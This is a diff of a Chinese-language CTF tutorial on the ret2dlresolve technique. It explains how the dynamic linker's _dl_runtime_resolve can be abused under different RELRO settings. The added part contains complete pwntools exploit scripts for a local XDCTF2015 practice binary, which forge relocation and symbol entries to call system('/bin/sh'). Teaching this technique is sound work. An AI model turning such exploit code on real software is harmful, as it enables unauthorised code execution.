@@ -40,7 +40,7 @@ typedef struct
 在 Linux 中，程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。   
 具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 .dynamic 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。   
 
-_dl_runtime_resolve会
+>`_dl_runtime_resolve(link_map_obj, reloc_offset)` 执行流程:   
 1. 用`link_map`访问`.dynamic`，取出`.dynstr`, `.dynsym`, .`rel.plt`的指针
 2. `.rel.plt` + 第二个参数求出当前函数的重定位表项`Elf32_Rel`的指针，记作rel
 3. `rel->r_info >> 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作sym
@@ -49,8 +49,9 @@ _dl_runtime_resolve会
 6. 调用这个函数
 
 ### 利用思路
-- 改写`.dynamic`的`DT_STRTAB`:checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用`free("bin/sh")`（因为只有第一次才会resolve），就等于调用了`system("/bin/sh")`。
-- 伪造 `link_map`：由于动态连接器在解析符号地址时，主要依赖于 `link_map` 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。
+1. 改写`.dynamic`的`DT_STRTAB`:checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用`free("bin/sh")`（因为只有第一次才会resolve），就等于调用了`system("/bin/sh")`。
+2. 控制`_dl_runtime_resolve(link_map_obj, reloc_offset)`第二个参数，指向我们所构造的Elf32_Rel。在`.dynamic`不可写的情况下采用。   
+3. 伪造 `link_map`：由于动态连接器在解析符号地址时，主要依赖于 `link_map` 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。
 
 ### 保护机制
 RELRO 全名為 RELocation Read Only。共有三種保护模式，分別為 No / Partial / Full。
@@ -161,7 +162,6 @@ print(rop.dump())
 
 io.recvuntil('Welcome to XDCTF2015~!')
 io.send(rop.chain())
-io.recv()
 io.send(p32(blank_addr))
 io.send(fake_dynstr_data)
 io.send(bin_sh_str)
@@ -170,11 +170,10 @@ io.interactive()
 ```
 
 ## Partial RELRO -32
-编译：   
-`gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie pwn5.c -o partial_relro_32`
-
 
 ### 题目
+编译：   
+`gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie pwn5.c -o partial_relro_32`
 
 checksec
 ```
@@ -184,4 +183,105 @@ checksec
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 ```
-Partial RELRO，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。   
+### 思路
+Partial RELRO，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以控制`_dl_runtime_resolve(link_map_obj, reloc_offset)`第二个参数，指向我们所构造的Elf32_Rel。   
+`_dl_runtime_resolve`执行第2步骤：
+>`.rel.plt` + 第二个参数`reloc_offset`求出当前函数的重定位表项Elf32_Rel的指针，记作rel
+
+这个时候并没有检测`.rel.plt` + 第二个参数`reloc_offset` 是否越界，以我们能给一个很大的`.rel.plt`的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说.bss。
+`_dl_runtime_resolve`执行第3步骤：
+>`rel->r_info >> 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作sym
+
+所以在我们所伪造的`Elf32_Rel`，需要放一个`r_info`字段，大概长这样就行0xXXXXXX07，其中XXXXXX是相对.dynsym表的下标，注意不是偏移，所以是偏移除以Elf32_Sym的大小，即除以0x10（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个Elf32_Sym。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。
+
+`_dl_runtime_resolve`执行第4步骤：
+>`.dynstr + sym->st_name`得出符号名字符串指针。
+
+即为我们控制的符号名
+
+### PWN
+#### 手工构造：
+```python
+from pwn import *
+context(log_level='debug')
+elf = ELF('partial_relro_32')
+io = process(elf.path)
+rop = ROP('partial_relro_32')
+
+fake_rel_addr = bss_blank_addr = 0x0804A050
+
+# 准备构造fake Elf32_Rel(dynsym表项)-计算偏移
+fake_sym_addr = bss_blank_addr + 8
+sym_table_addr = 0x080481D8
+sizeof_sym = 0x10
+fake_sym_table_idx = (((fake_sym_addr-sym_table_addr)//sizeof_sym) <<8) + 7
+# 准备构造fake Elf32_Sym(dynstr表项)-计算偏移
+str_table_addr = 0x08048278
+system_addr = fake_sym_addr + 0x10
+bin_sh_addr = system_addr + 7
+fake_str_offset = system_addr - str_table_addr
+
+# 构造fake Elf32_Rel
+read_got_addr = elf.got['read']
+fake_Elf32_Rel = p32(read_got_addr)
+fake_Elf32_Rel += p32(fake_sym_table_idx)
+
+# 构造fake Elf32_Sym
+fake_Elf32_Sym = p32(fake_str_offset)
+fake_Elf32_Sym += p32(0)
+fake_Elf32_Sym += p32(0)
+fake_Elf32_Sym += p8(0x12) + p8(0) + p16(0)
+
+strings_system_bin_sh = b"system\x00/bin/sh\x00"
+
+# resolve的PLT，push link_map的位置
+dyn_resolve_plt_addr = 0x08048380
+# fake rel表项的偏移
+rel_addr = 0x08048330 
+fake_rel_offset = fake_rel_addr - rel_addr
+
+fake_data = fake_Elf32_Rel + fake_Elf32_Sym + strings_system_bin_sh
+
+payload = flat(['a'*0x6c+'bbbb'])
+rop.raw(payload)
+rop.read(0,bss_blank_addr,len(fake_data))
+rop.raw(p32(dyn_resolve_plt_addr))
+rop.raw(p32(fake_rel_offset))
+rop.raw('cccc')
+rop.raw(p32(bin_sh_addr))
+
+io.recvuntil('Welcome to XDCTF2015~!')
+io.send(rop.chain())
+io.send(fake_data)
+io.interactive()
+
+```
+pwntools 自带的模块：
+```python
+from pwn import *
+context.binary = elf = ELF("partial_relro_32")
+io = process("partial_relro_32")
+rop = ROP(context.binary)
+dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
+# pwntools will help us choose a proper addr
+# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
+rop.read(0,dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+io.recvuntil("Welcome to XDCTF2015~!\n")
+payload = flat({112:raw_rop,256:dlresolve.payload})
+io.sendline(payload)
+io.interactive()
+```
+
+## No RELRO - 64
+## 题目
+`gcc -fno-stack-protector  -z norelro -no-pie pwn5.c -o norelro_64`   
+checksec
+```
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
